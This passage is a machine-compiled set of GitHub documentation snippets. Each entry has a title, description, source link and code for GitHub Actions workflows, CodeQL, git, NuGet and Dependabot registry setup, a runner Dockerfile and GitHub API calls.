username and a personal access token for authentication, ensuring packages are published to the correct namespace.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ndotnet nuget add source --username OWNER --password {% raw %}YOUR_GITHUB_PAT{% endraw %} --store-password-in-clear-text --name github \"https://{% ifversion fpt or ghec %}nuget.pkg.github.com{% else %}nuget.HOSTNAME{% endif %}/OWNER/index.json\"\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PROJECT_PATH_SLUG to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PROJECT_PATH_SLUG` to the GitHub Actions equivalent `${{ github.repository }}`. The slugified project path.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_40\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.repository }}\n```\n\n----------------------------------------\n\nTITLE: Action Metadata Definition\nDESCRIPTION: Defines the metadata for the composite action in the `action.yml` file. This includes the action's name, description, inputs (who-to-greet), outputs (random-number), and the steps to be executed. It specifies how to greet someone based on input and sets a random number as an output.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nname: 'Hello World'\ndescription: 'Greet someone'\ninputs:\n  who-to-greet:  # id of input\n    description: 'Who to greet'\n    required: true\n    default: 'World'\noutputs:\n  random-number:\n    description: \"Random number\"\n    value: {% raw %}${{ steps.random-number-generator.outputs.random-number }}{% endraw %}\nruns:\n  using: \"composite\"\n  steps:\n    - name: Set Greeting\n      run: echo \"Hello $INPUT_WHO_TO_GREET.\"\n      shell: bash\n      env:\n        INPUT_WHO_TO_GREET: {% raw %}${{ inputs.who-to-greet }}{% endraw %}\n\n    - name: Random Number Generator\n      id: random-number-generator\n      run: echo \"random-number=$(echo $RANDOM)\" >> $GITHUB_OUTPUT\n      shell: bash\n\n    - name: Set GitHub Path\n      run: echo \"$GITHUB_ACTION_PATH\" >> $GITHUB_PATH\n      shell: bash\n      env:\n        GITHUB_ACTION_PATH: {% raw %}${{ github.action_path }}{% endraw %}\n\n    - name: Run goodbye.sh\n      run: goodbye.sh\n      shell: bash\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Branding in YAML\nDESCRIPTION: This snippet shows how to configure branding elements for a GitHub Action, specifically the icon and color that appear in the GitHub Marketplace. The `branding` section includes `icon` to specify a Feather icon and `color` to set the badge background color.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\nbranding:\n  icon: 'award'\n  color: 'green'\n```\n\n----------------------------------------\n\nTITLE: Caching PowerShell Module Dependencies (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to cache PowerShell module dependencies in a GitHub Actions workflow using the `cache` action. It sets a cache key based on the runner's OS and the names of the modules being cached (`SqlServer` and `PSScriptAnalyzer`). The modules are only installed if the cache is a miss.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-powershell.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - name: Setup PowerShell module cache\n    id: cacher\n    uses: {% data reusables.actions.action-cache %}\n    with:\n      path: \"~/.local/share/powershell/Modules\"\n      key: {% raw %}${{ runner.os }}-SqlServer-PSScriptAnalyzer{% endraw %}\n  - name: Install required PowerShell modules\n    if: steps.cacher.outputs.cache-hit != 'true'\n    shell: pwsh\n    run: |\n      Set-PSRepository PSGallery -InstallationPolicy Trusted\n      Install-Module SqlServer, PSScriptAnalyzer -ErrorAction Stop\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Java Project with Gradle\nDESCRIPTION: This snippet creates a CodeQL database for a Java/Kotlin project built with Gradle. It uses `--no-daemon` to avoid issues with build delegation and recommends `--no-build-cache` for persistent machines.  It assumes Gradle and CodeQL CLI are installed and configured correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\n# Use `--no-daemon` because a build delegated to an existing daemon cannot be detected by CodeQL.\n# To ensure isolated builds without caching, add `--no-build-cache` on persistent machines.\ncodeql database create java-database --language=java-kotlin --command='gradle --no-daemon clean test'\n```\n\n----------------------------------------\n\nTITLE: Trigger Workflow on Check Run Event - YAML\nDESCRIPTION: This snippet configures a workflow to run when a check run is rerequested or completed. It specifies the `check_run` event and the `rerequested` and `completed` activity types. The workflow will trigger on activity related to a check run, which is an individual test that is part of a check suite.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  check_run:\n    types: [rerequested, completed]\n```\n\n----------------------------------------\n\nTITLE: Adding description to multi-arch image manifest\nDESCRIPTION: This JSON snippet illustrates how to add a description to a multi-architecture image by setting the `org.opencontainers.image.description` key in the `annotations` field of the image's manifest.  This description will appear on the package page for the image.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_13\n\nLANGUAGE: json\nCODE:\n```\n\"annotations\": {\n  \"org.opencontainers.image.description\": \"My multi-arch image\"\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variable using Bash\nDESCRIPTION: This bash script sets an environment variable by appending a string to the `$GITHUB_ENV` file. The string is formatted as `{environment_variable_name}={value}`. The file encoding is expected to be UTF-8.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_31\n\nLANGUAGE: bash\nCODE:\n```\necho \"{environment_variable_name}={value}\" >> \"$GITHUB_ENV\"\n```\n\n----------------------------------------\n\nTITLE: Searching GitHub pull requests using gh search prs\nDESCRIPTION: This command searches for pull requests based on specified criteria like review request and state.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ngh search prs --review-requested=@me --state=open\n```\n\n----------------------------------------\n\nTITLE: Finding User Project Node ID (gh cli)\nDESCRIPTION: This snippet demonstrates how to find the node ID of a user project using the GitHub CLI with a GraphQL query. Replace `USER` with the user's username and `NUMBER` with the project number. Authentication with `gh auth login --scopes \"project\"` or `gh auth login --scopes \"read:project\"` is required.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  query{\n    user(login: \"USER\"){\n      projectV2(number: NUMBER) {\n        id\n      }\n    }\n  }'\n```\n\n----------------------------------------\n\nTITLE: Creating an action metadata file (action.yml)\nDESCRIPTION: Defines the metadata for the action, including its name, description, inputs, outputs, and runtime configuration. It specifies that the action uses a Docker container and passes the `who-to-greet` input to the container.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-docker-container-action.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\n# action.yml\nname: 'Hello World'\ndescription: 'Greet someone and record the time'\ninputs:\n  who-to-greet:  # id of input\n    description: 'Who to greet'\n    required: true\n    default: 'World'\noutputs:\n  time: # id of output\n    description: 'The time we greeted you'\nruns:\n  using: 'docker'\n  image: 'Dockerfile'\n  args:\n    - ${{ inputs.who-to-greet }}\n```\n\n----------------------------------------\n\nTITLE: Matching Images with Helm - trust-policies\nDESCRIPTION: This command configures the `trust-policies` Helm chart to enforce attestations only for images matching the pattern `ghcr.io/MY-ORGANIZATION/*` while exempting `busybox` from attestation requirements. It utilizes the `policy.images` and `policy.exemptImages` Helm values to specify the image matching patterns, replacing `MY-ORGANIZATION` with the target GitHub organization. Globbing syntax `**` is used to match any character sequence.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nhelm upgrade trust-policies --install --atomic \\\n --namespace artifact-attestations \\\n oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies \\\n --version v0.6.2 \\\n --set policy.enabled=true \\\n --set policy.organization=MY-ORGANIZATION \\\n --set-json 'policy.exemptImages=[\"index.docker.io/library/busybox**\"]' \\\n --set-json 'policy.images=[\"ghcr.io/MY-ORGANIZATION/**\"]'\n```\n\n----------------------------------------\n\nTITLE: Retrieving Pull Request Data with GraphQL (Nested Query)\nDESCRIPTION: This GraphQL query demonstrates nested fields, allowing the retrieval of a pull request along with its commits, comments, and reviews in a single query. This reduces the number of API calls required compared to the REST API.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_6\n\nLANGUAGE: graphql\nCODE:\n```\n{\n  repository(owner: \"octocat\", name: \"Hello-World\") {\n    pullRequest(number: 1) {\n      commits(first: 10) {\n        edges {\n          node {\n            commit {\n              oid\n              message\n            }\n          }\n        }\n      }\n      comments(first: 10) {\n        edges {\n          node {\n            body\n            author {\n              login\n            }\n          }\n        }\n      }\n      reviews(first: 10) {\n        edges {\n          node {\n            state\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Uploading GitHub Pages Artifact\nDESCRIPTION: This snippet uploads a GitHub Pages artifact using the `actions/upload-pages-artifact` action. The specific version of the action depends on the GitHub Enterprise Server (GHES) version. It uploads a compressed `gzip` archive containing a single `tar` file.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/getting-started-with-github-pages/using-custom-workflows-with-github-pages.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Upload GitHub Pages artifact\n{%- ifversion fpt or ghec %}\n  uses: actions/upload-pages-artifact@v3\n{%- elsif ghes %}\n  uses: actions/upload-pages-artifact@v2\n{%- endif %}\n```\n\n----------------------------------------\n\nTITLE: Renaming a Branch During Push with Git\nDESCRIPTION: This command renames a branch while pushing it to a remote repository. It requires the remote name, the local branch name, and the new name for the branch on the remote.  This effectively pushes the local branch's contents to a new branch name on the remote.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/pushing-commits-to-a-remote-repository.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit push REMOTE-NAME LOCAL-BRANCH-NAME:REMOTE-BRANCH-NAME\n```\n\n----------------------------------------\n\nTITLE: Preventing Workflow Failures with `jobs.<job_id>.continue-on-error`\nDESCRIPTION: This YAML snippet shows how to use `jobs.<job_id>.continue-on-error` in conjunction with a matrix strategy to allow specific jobs in a job matrix to fail without failing the entire workflow run. This is useful for experimental jobs or jobs that are expected to fail occasionally.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_30\n\nLANGUAGE: yaml\nCODE:\n```\nruns-on: ${{ matrix.os }}\ncontinue-on-error: ${{ matrix.experimental }}\nstrategy:\n  fail-fast: false\n  matrix:\n    node: [13, 14]\n    os: [macos-latest, ubuntu-latest]\n    experimental: [false]\n    include:\n      - node: 15\n        os: ubuntu-latest\n        experimental: true\n```\n\n----------------------------------------\n\nTITLE: Vitest Unit Test with Mock Service\nDESCRIPTION: This Vitest unit test mocks the `service` module to isolate the `load` function being tested from external dependencies.  It uses `vi.mock` to replace the actual service with a mock implementation that allows for controlled responses and assertions.  The test verifies that the `getRunner` method is called correctly with the expected ID and that the `load` function returns the expected runner data.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/testing-code/create-mock-objects-to-abstract-layers.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nimport { describe, it, expect, vi, beforeEach } from 'vitest';\nimport { load } from './+page.server.ts';\n\n// Mock the entire service module\nvi.mock('./service', () => ({\n  default: {\n    getRunner: vi.fn()\n  }\n}));\n\n// Import the mocked service\nimport service from './service';\n\ndescribe('load function', () => {\n  const mockRunner = {\n    id: '123',\n    name: 'Test Runner',\n    status: 'active'\n  };\n\n  beforeEach(() => {\n    // Reset mock before each test\n    vi.resetAllMocks();\n\n    // Setup default mock implementation\n    (service.getRunner as any).mockResolvedValue(mockRunner);\n  });\n\n  it('should fetch runner with correct id', async () => {\n    const params = { id: '123' };\n    const result = await load({ params });\n\n    expect(service.getRunner).toHaveBeenCalledWith('123');\n    expect(service.getRunner).toHaveBeenCalledTimes(1);\n    expect(result).toEqual({ runner: mockRunner });\n  });\n});\n```\n\n----------------------------------------\n\nTITLE: Searching for files in a specific directory using Regular Expressions\nDESCRIPTION: This snippet shows how to use a regular expression to search for files within the `App/src` directory. It demonstrates escaping forward slashes within the regex.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_28\n\nLANGUAGE: text\nCODE:\n```\n/^App\\/src\\//\n```\n\n----------------------------------------\n\nTITLE: Configuring git to always ignore revs file\nDESCRIPTION: This command configures the local Git repository to always ignore the revisions listed in the `.git-blame-ignore-revs` file when running `git blame`.  This eliminates the need to specify the `--ignore-revs-file` option every time, simplifying the blame process.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/using-files/viewing-and-understanding-files.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit config blame.ignoreRevsFile .git-blame-ignore-revs\n```\n\n----------------------------------------\n\nTITLE: Updating Listener Pod Specification - YAML\nDESCRIPTION: This YAML snippet demonstrates how to update the pod specification for the listener pod in Actions Runner Controller.  It's crucial to retain the `listenerTemplate.spec.containers.name` value to ensure the configuration applies to the correct container and not a new sidecar. The example showcases setting security context and resource limits.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_21\n\nLANGUAGE: yaml\nCODE:\n```\nlistenerTemplate:\n  spec:\n    containers:\n    # If you change the name of the container, the configuration will not be applied to the listener,\n    # and it will be treated as a side-car container.\n    - name: listener\n      securityContext:\n        runAsUser: 1000\n      resources:\n        limits:\n          cpu: \"1\"\n          memory: 1Gi\n        requests:\n          cpu: \"1\"\n          memory: 1Gi\n```\n\n----------------------------------------\n\nTITLE: Caching npm Dependencies in GitHub Actions (YAML)\nDESCRIPTION: This workflow caches npm dependencies using the `setup-node` action. It checks out the code, configures Node.js with caching enabled for npm, installs dependencies using `npm install`, and runs tests using `npm test`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- uses: {% data reusables.actions.action-setup-node %}\n  with:\n    node-version: '20'\n    cache: 'npm'\n- run: npm install\n- run: npm test\n```\n\n----------------------------------------\n\nTITLE: Pushing changes to remote repository using Git\nDESCRIPTION: This shell command pushes the local commits to the remote repository. `git push --set-upstream origin HEAD` pushes the changes to the origin remote, setting the upstream branch to HEAD.  The upstream branch is the remote branch that corresponds to the local branch.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/quickstart-for-repositories.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit push --set-upstream origin HEAD\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on JavaScript File Push (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to configure a GitHub Actions workflow to trigger only when a push event includes changes to JavaScript files (``.js``) within the repository. The `paths` filter specifies the file patterns that should trigger the workflow.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/triggering-a-workflow-paths2.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    paths:\n      - '**.js'\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Runner Image with Dockerfile\nDESCRIPTION: This Dockerfile provides an example of how to create a custom runner image for ARC. It installs necessary dependencies, adds a runner user, downloads and extracts the runner binaries and container hooks, and sets the user to runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-actions-runner-controller.md#_snippet_0\n\nLANGUAGE: Dockerfile\nCODE:\n```\nFROM mcr.microsoft.com/dotnet/runtime-deps:6.0 as build\n\n# Replace value with the latest runner release version\n# source: https://github.com/actions/runner/releases\n# ex: 2.303.0\nARG RUNNER_VERSION=\"\"\nARG RUNNER_ARCH=\"x64\"\n# Replace value with the latest runner-container-hooks release version\n# source: https://github.com/actions/runner-container-hooks/releases\n# ex: 0.3.1\nARG RUNNER_CONTAINER_HOOKS_VERSION=\"\"\n\nENV DEBIAN_FRONTEND=noninteractive\nENV RUNNER_MANUALLY_TRAP_SIG=1\nENV ACTIONS_RUNNER_PRINT_LOG_TO_STDOUT=1\n\nRUN apt update -y && apt install curl unzip -y\n\nRUN adduser --disabled-password --gecos \"\" --uid 1001 runner \\\n    && groupadd docker --gid 123 \\\n    && usermod -aG sudo runner \\\n    && usermod -aG docker runner \\\n    && echo \"%sudo ALL=(ALL:ALL) NOPASSWD:ALL\" > /etc/sudoers \\\n    && echo \"Defaults env_keep += \\\"DEBIAN_FRONTEND\\\"\" >> /etc/sudoers\n\nWORKDIR /home/runner\n\nRUN curl -f -L -o runner.tar.gz https://github.com/actions/runner/releases/download/v${RUNNER_VERSION}/actions-runner-linux-${RUNNER_ARCH}-${RUNNER_VERSION}.tar.gz \\\n    && tar xzf ./runner.tar.gz \\\n    && rm runner.tar.gz\n\nRUN curl -f -L -o runner-container-hooks.zip https://github.com/actions/runner-container-hooks/releases/download/v${RUNNER_CONTAINER_HOOKS_VERSION}/actions-runner-hooks-k8s-${RUNNER_CONTAINER_HOOKS_VERSION}.zip \\\n    && unzip ./runner-container-hooks.zip -d ./k8s \\\n    && rm runner-container-hooks.zip\n\nUSER runner\n```\n\n----------------------------------------\n\nTITLE: Defining a Scheduled Workflow\nDESCRIPTION: This YAML snippet demonstrates how to define a scheduled workflow using the `schedule` event and cron syntax. The `cron` value specifies when the workflow will run.  Users should change the cron value to their desired schedule.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_46\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  schedule:\n    - cron: \"15 4,5 * * *\"   # <=== Change this value\n```\n\n----------------------------------------\n\nTITLE: Accessing Response Data from Octokit.request\nDESCRIPTION: This snippet shows how to make a request using `octokit.request` and access properties of the response object, such as `status`, `url`, headers, and the response `data`.  It then logs the values of several of these properties to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_15\n\nLANGUAGE: javascript\nCODE:\n```\nconst response = await octokit.request(\"GET /repos/{owner}/{repo}/issues/{issue_number}\", {\n  owner: \"github\",\n  repo: \"docs\",\n  issue_number: 11901,\n  headers: {\n    \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n  },\n});\n\nconsole.log(`The status of the response is: ${response.status}`)\nconsole.log(`The request URL was: ${response.url}`)\nconsole.log(`The x-ratelimit-remaining response header is: ${response.headers[\"x-ratelimit-remaining\"]}`)\nconsole.log(`The issue title is: ${response.data.title}`)\n```\n\n----------------------------------------\n\nTITLE: Staging and Committing changes in Git\nDESCRIPTION: This shell command stages the README.md file and commits the staged changes with a commit message. `git add README.md` stages the file, and `git commit -m \"Add README\"` commits the changes with the message 'Add README'.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/quickstart-for-repositories.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit add README.md && git commit -m \"Add README\"\n```\n\n----------------------------------------\n\nTITLE: Interactive Rebase for Multiple Commit Changes\nDESCRIPTION: This snippet illustrates how to use interactive rebase (`git rebase -i`) to modify multiple commit messages. The `HEAD~n` option specifies the number of recent commits to include in the rebase session. The example shows rebasing the last 3 commits.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/changing-a-commit-message.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n# Displays a list of the last 3 commits on the current branch\n$ git rebase -i HEAD~3\n```\n\n----------------------------------------\n\nTITLE: Fetching Updates from a Remote Repository with Git\nDESCRIPTION: This snippet shows how to use `git fetch` to retrieve updates from a remote repository. It fetches new remote-tracking branches and tags without merging them into the local branches. `REMOTE-NAME` represents the name assigned to the remote repository.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/getting-changes-from-a-remote-repository.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git fetch REMOTE-NAME\n# Fetches updates made to a remote repository\n```\n\n----------------------------------------\n\nTITLE: Configuring unregistered TLDs proxy exception\nDESCRIPTION: This shell command configures the GitHub Enterprise Server instance to exclude specified unregistered top-level domains (TLDs) from the proxy. Replace `COMMA-SEPARATED-TLD-LIST` with a comma-separated list of TLDs, each prefixed with a `.` wildcard. For example: `.example,.internal`.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-network-settings/configuring-an-outbound-web-proxy-server.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config noproxy.exception-tld-list \"COMMA-SEPARATED-TLD-LIST\"\n```\n\n----------------------------------------\n\nTITLE: Reusable Workflow Example using `jobs` Context - YAML\nDESCRIPTION: This YAML snippet defines a reusable workflow that utilizes the `jobs` context to set outputs. The outputs are defined at the `workflow_call` level, mapping to outputs from the `example_job` and its steps. This demonstrates how to pass outputs from steps up through the job and then to the calling workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nname: Reusable workflow\n\non:\n  workflow_call:\n    # Map the workflow outputs to job outputs\n    outputs:\n      firstword:\n        description: \"The first output string\"\n        value: ${{ jobs.example_job.outputs.output1 }}\n      secondword:\n        description: \"The second output string\"\n        value: ${{ jobs.example_job.outputs.output2 }}\n\njobs:\n  example_job:\n    name: Generate output\n    runs-on: ubuntu-latest\n    # Map the job outputs to step outputs\n    outputs:\n      output1: ${{ steps.step1.outputs.firstword }}\n      output2: ${{ steps.step2.outputs.secondword }}\n    steps:\n      - id: step1\n        run: echo \"firstword=hello\" >> $GITHUB_OUTPUT\n      - id: step2\n        run: echo \"secondword=world\" >> $GITHUB_OUTPUT\n```\n\n----------------------------------------\n\nTITLE: React Counter Component with Embedded Logic\nDESCRIPTION: This code defines a React component `Counter` with embedded state management and increment logic. The component maintains a count and an increment function that updates the count state. It also includes a check to prevent the count from exceeding 10, showing an alert if the limit is reached.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/decoupling-business-logic-from-ui-components.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport React, { useState } from 'react';\n\nconst Counter = () => {\n  const [count, setCount] = useState(0);\n\n  const increment = () => {\n    if (count >= 10) {\n      alert('Count cannot exceed 10');\n      return;\n    }\n    setCount(count + 1);\n  };\n\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={increment}>Increment</button>\n    </div>\n  );\n};\n\nexport default Counter;\n```\n\n----------------------------------------\n\nTITLE: Defining CodeQL Workspace Configuration\nDESCRIPTION: This YAML snippet demonstrates a `codeql-workspace.yml` file configuration. It specifies which CodeQL packs to include from the `codeql-packs` directory (excluding those in the `experimental` subdirectory), and configures container registry URLs for different package patterns.  The `provide` and `ignore` directives use glob patterns to determine which packs are part of the workspace. The registries section specifies which container registry to use for publishing CodeQL packs based on a package pattern.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/about-codeql-workspaces.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nprovide:\n  - \"*/codeql-packs/**/qlpack.yml\"\nignore:\n  - \"*/codeql-packs/**/experimental/**/qlpack.yml\"\n\nregistries:\n - packages: 'codeql/*'\n   url: https://ghcr.io/v2/\n\n - packages: '*'\n   url: https://containers.GHE_HOSTNAME/v2/\n```\n\n----------------------------------------\n\nTITLE: Configuring NuGet feed with ProGet for Dependabot\nDESCRIPTION: This YAML snippet configures Dependabot to use a ProGet NuGet feed. It defines the registry type as `nuget-feed`, provides the URL of the feed's index, and specifies the token for authentication. The token is expected to be stored as a secret in the environment.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  proget-nuget-feed:\n    type: nuget-feed\n    url: https://proget.corp.local/nuget/MyNuGetFeed/v3/index.json\n    token: ${{secrets.PROGET_APK_KEY}}\n```\n\n----------------------------------------\n\nTITLE: Cloning with HTTPS\nDESCRIPTION: This snippet demonstrates how to clone a Git repository using HTTPS instead of SSH.  This method is often successful when SSH connections are blocked by firewalls or proxy servers. Replace `USERNAME` and `REPO-NAME` with the appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-bad-file-number.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git clone https://{% data variables.product.product_url %}/USERNAME/REPO-NAME.git\n> Cloning into 'reponame'...\n> remote: Counting objects: 84, done.\n> remote: Compressing objects: 100% (45/45), done.\n> remote: Total 84 (delta 43), reused 78 (delta 37)\n> Unpacking objects: 100% (84/84), done.\n```\n\n----------------------------------------\n\nTITLE: Ensuring Unique Checkbox Labels in YAML\nDESCRIPTION: This snippet details resolving the 'Checkboxes must have unique labels' error. When a checkboxes element is present, each of its nested labels must be unique among its peers, as well as among other input types.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: textarea\n  attributes:\n    label: Name\n- type: checkboxes\n  attributes:\n    options:\n    - label: Name\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: textarea\n  attributes:\n    label: Name\n- type: checkboxes\n  attributes:\n    options:\n    - label: Your name\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: textarea\n  id: name_1\n  attributes:\n    label: Name\n- type: checkboxes\n  attributes:\n    options:\n    - label: Name\n\n```\n\n----------------------------------------\n\nTITLE: Displaying Dry-Run Options - Bash\nDESCRIPTION: This command displays available options for the `dry-run` subcommand of the GitHub Actions Importer CLI.  The `dry-run` subcommand converts a pipeline to a GitHub Actions workflow and outputs the YAML file locally for testing. The `-h` flag shows the help message.  The command is executed via the `gh` CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ gh actions-importer dry-run -h\n```\n\n----------------------------------------\n\nTITLE: Setting Permissions for Attestation Generation in GitHub Actions\nDESCRIPTION: This code snippet configures the necessary permissions in a GitHub Actions workflow to allow the generation of artifact attestations. It grants write access to the `id-token`, read access to the `contents`, and write access to `attestations` and `packages`. These permissions are essential for the workflow to interact with the GitHub Actions attestation services.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\npermissions:\n  id-token: write\n  contents: read\n  attestations: write\n```\n\n----------------------------------------\n\nTITLE: Trigger Workflow with PAT using GitHub CLI - YAML\nDESCRIPTION: This workflow demonstrates triggering another workflow by adding a label to an issue using a personal access token (PAT) stored as a secret. It uses the GitHub CLI (`gh`) to add the label. The workflow is triggered when a new issue is opened.  It uses a PAT (stored as `MY_TOKEN`) to avoid triggering other workflows recursively.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  issues:\n    types:\n      - opened\n\njobs:\n  label_issue:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          GH_TOKEN: {% raw %}${{ secrets.MY_TOKEN }}{% endraw %}\n          ISSUE_URL: {% raw %}${{ github.event.issue.html_url }}{% endraw %}\n        run: |\n          gh issue edit $ISSUE_URL --add-label \"triage\"\n```\n\n----------------------------------------\n\nTITLE: Confirming global email address in Git\nDESCRIPTION: Retrieves and displays the globally configured email address in Git. This allows you to verify that the email address has been set correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-email-preferences/setting-your-commit-email-address.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ git config --global user.email\nemail@example.com\n```\n\n----------------------------------------\n\nTITLE: Authenticating with JWT via cURL\nDESCRIPTION: This snippet demonstrates how to authenticate as a GitHub App using a JSON Web Token (JWT) by including it in the `Authorization` header of a cURL request.  Replace `YOUR_JWT` with the actual JWT. This example retrieves app installations.\nSOURCE: 